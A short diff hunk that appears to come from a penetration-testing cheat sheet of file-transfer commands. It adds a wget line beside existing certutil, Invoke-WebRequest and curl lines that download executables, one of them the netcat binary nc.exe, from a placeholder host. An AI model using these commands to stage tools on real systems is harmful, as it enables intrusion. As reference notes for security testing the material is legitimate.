@@ -432,6 +432,8 @@ certutil -urlcache -f -split <target>
 Invoke-WebRequest <target> -OutFile <Path>
 
 curl http://example.com/nc.exe -o nc.exe
+
+wget http://example.com/file.exe -OutFile file.exe
 ```
 
 ---
